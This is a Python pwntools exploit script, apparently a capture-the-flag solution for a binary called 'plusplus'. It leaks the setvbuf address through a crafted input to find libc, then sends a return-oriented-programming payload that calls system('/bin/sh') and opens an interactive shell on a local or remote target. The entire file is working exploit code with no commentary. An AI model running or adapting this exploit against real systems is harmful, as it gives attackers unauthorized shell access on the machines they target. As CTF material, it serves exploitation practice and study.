#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

context.arch = 'amd64'
libc = ELF("./libc.so.6")
context.log_level = 'error'

if args.REMOTE:
    io = remote(sys.argv[1], sys.argv[2])
else:
    exe = "./plusplus"
    io = process(argv=[exe], aslr=False)
if args.GDB:
    gdb.attach(io, """
        b *main+721
    """)

io.sendlineafter(b"+ ", b"{0:a>256}")
io.recvuntil(b"80")
leak = hexleak(io.recvline())
print("setvbuf @ %#x" % leak)

libc.address = leak - libc.sym.setvbuf
print("libc @ %#x" % libc.address)

POP_RDI = libc.address + 0x000000000010f75b
RET     = libc.address + 0x000000000002882f

payload = flat(
    cyclic(0x1b8, n=8),
    POP_RDI,
    next(libc.search(b"/bin/sh\x00")),
    RET,
    libc.sym.system
)
io.sendlineafter(b"++ ", payload)

io.interactive()
